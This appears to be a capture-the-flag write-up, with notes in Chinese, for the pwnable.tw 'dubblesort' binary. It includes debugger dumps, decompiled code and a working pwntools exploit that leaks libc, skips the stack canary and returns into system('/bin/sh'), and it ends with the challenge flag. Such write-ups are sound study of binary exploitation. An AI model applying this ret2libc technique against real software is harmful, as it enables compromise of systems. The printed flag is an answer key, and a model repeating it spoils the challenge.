# dubblesort


```
user@vm-ubuntu20:~/tw$ checksec dubblesort
[*] '/home/user/tw/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
保護全開

很明顯的問題，輸入的數字數量沒有限制以及讀取名字的時候可能會讀出其他的資料（read 後沒有補上\x00

可以用 scanf 特性，輸入為 + - 時候，可以跳過寫入，對 canary 就不寫入

題目有給 libc，可以從讀取名字 leak 出 GLOBAL_OFFSET_TABLE，找到 base addr，之後 ret2lic 拿 shell

構造 payload 要去注意大小，避免 sort

>leak 發現 got 沒有對齊，所以手動-0xa
>got remote local 的位置有差
```
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
   0x565559fc <main+57>     call   __printf_chk@plt                    <__printf_chk@plt>
 
   0x56555a01 <main+62>     mov    dword ptr [esp + 8], 0x40
   0x56555a09 <main+70>     lea    esi, [esp + 0x3c]
   0x56555a0d <main+74>     mov    dword ptr [esp + 4], esi
   0x56555a11 <main+78>     mov    dword ptr [esp], 0
 ► 0x56555a18 <main+85>     call   read@plt                    <read@plt>
        fd: 0x0 (/dev/pts/7)
        buf: 0xffffd0bc —▸ 0xffffd290 ◂— 0x20 /* ' ' */
        nbytes: 0x40
 
   0x56555a1d <main+90>     mov    dword ptr [esp + 8], esi
   0x56555a21 <main+94>     lea    eax, [ebx - 0x137c]
   0x56555a27 <main+100>    mov    dword ptr [esp + 4], eax
   0x56555a2b <main+104>    mov    dword ptr [esp], 1
   0x56555a32 <main+111>    call   __printf_chk@plt                    <__printf_chk@plt>
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd080 ◂— 0x0
01:0004│     0xffffd084 —▸ 0xffffd0bc —▸ 0xffffd290 ◂— 0x20 /* ' ' */
02:0008│     0xffffd088 ◂— 0x40 /* '@' */
03:000c│     0xffffd08c ◂— 0x0
... ↓        3 skipped
07:001c│     0xffffd09c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c

pwndbg> stack 10
00:0000│ esp 0xffffd080 ◂— 0x1
01:0004│     0xffffd084 —▸ 0x56555c24 ◂— dec eax /* 'Hello %s,How many numbers do you what to sort :' */
02:0008│     0xffffd088 —▸ 0xffffd0bc —▸ 0xffffd20a ◂— 0xd4aeffff
03:000c│     0xffffd08c ◂— 0x0
... ↓        3 skipped
07:001c│     0xffffd09c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
08:0020│     0xffffd0a0 —▸ 0xf7fc4540 (__kernel_vsyscall) ◂— push ecx
09:0024│     0xffffd0a4 ◂— 0xffffffff
```

```
user@vm-ubuntu20:~/tw$ readelf -S libc_32.so.6 
There are 68 section headers, starting at offset 0x1b0cc8:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4
```


```clike=

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int nn_num; // eax
  int *nn_each_num_arr; // edi
  unsigned int nn_counter; // esi
  unsigned int nn_c; // esi
  int v7; // ST08_4
  int result; // eax
  unsigned int nn_input_num; // [esp+18h] [ebp-74h]
  int nn_arr; // [esp+1Ch] [ebp-70h]   
  char buf_name; // [esp+3Ch] [ebp-50h]
  unsigned int v12; // [esp+7Ch] [ebp-10h] canary

  v12 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");
  read(0, &buf_name, 0x40u);
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &nn_input_num);
  nn_num = nn_input_num;
  if ( nn_input_num )
  {
    nn_each_num_arr = &nn_arr;
    nn_counter = 0;
    do
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", nn_each_num_arr);
      ++nn_counter;
      nn_num = nn_input_num;
      ++nn_each_num_arr;
    }
    while ( nn_input_num > nn_counter );
  }
  nn_sort((unsigned int *)&nn_arr, nn_num);
  puts("Result :");
  if ( nn_input_num )
  {
    nn_c = 0;
    do
    {
      v7 = *(&nn_arr + nn_c);
      __printf_chk(1, "%u ");
      ++nn_c;
    }
    while ( nn_input_num > nn_c );
  }
  result = 0;
  if ( __readgsdword(0x14u) != v12 )
    sub_BA0();
  return result;
}
```
因為main最後有這些，所以在疊 payload 會需要比較多垃圾
```
 ► 0x565a8b10 <main+333>    lea    esp, [ebp - 0xc]
   0x565a8b13 <main+336>    pop    ebx
   0x565a8b14 <main+337>    pop    esi
   0x565a8b15 <main+338>    pop    edi
   0x565a8b16 <main+339>    pop    ebp
   0x565a8b17 <main+340>    ret    

```
exploit
```python=
from pwn import *
import os
context(log_level="debug")

lib = ELF("./libc_32.so.6")


#p = process('./dubblesort')
#p = process('./dubblesort',env={"LD_PRELOAD":"./libc_32.so.6"})
p = remote('chall.pwnable.tw',10101)

p.sendlineafter('What your name :',b'A'*28 ) #local 24 remote 28
p.recvuntil(b'A'*28)
got=u32(p.recv(4))

static_got=lib.get_section_by_name('.got.plt').header.sh_addr
lib_base=got-static_got-0xa
print("static_got",hex(static_got))
print("got",hex(got))
print("lib_base",hex(lib_base))

system = lib_base + lib.symbols['system']
binsh = lib_base + next(lib.search(b'/bin/sh'))
print("system",hex(system))
print("binsh",hex(binsh))
# p.interactive()
# p.recv()
p.sendline("35")


for i in range(24):
    p.sendlineafter('number','1')

#canary
p.sendlineafter('number','+')

for i in range(8):     
    p.sendlineafter('number', str(system))

#input('::::')

p.sendlineafter('number', str(system))
p.sendlineafter('number', str(binsh))
p.recv()

p.interactive()

```
>FLAG{Dubo_duBo_dub0_s0rttttttt}


